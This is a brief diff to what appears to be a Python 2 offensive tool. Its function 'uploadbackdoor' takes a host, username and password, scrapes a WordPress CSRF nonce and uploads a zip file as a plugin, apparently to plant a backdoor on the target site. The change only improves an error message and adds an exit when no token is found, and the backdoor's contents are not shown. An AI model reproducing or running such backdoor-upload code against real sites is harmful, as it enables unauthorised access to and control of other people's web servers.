@@ -43,7 +43,8 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
         if verbose is True:
             print "Found CSRF Token: " + nonce
     except:
-        print "Didn't find nonce"
+        print "Didn't find a CSRF token, check the URL."
+        sys.exit(2)
 
     files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
              '_wpnonce': (None, nonce),
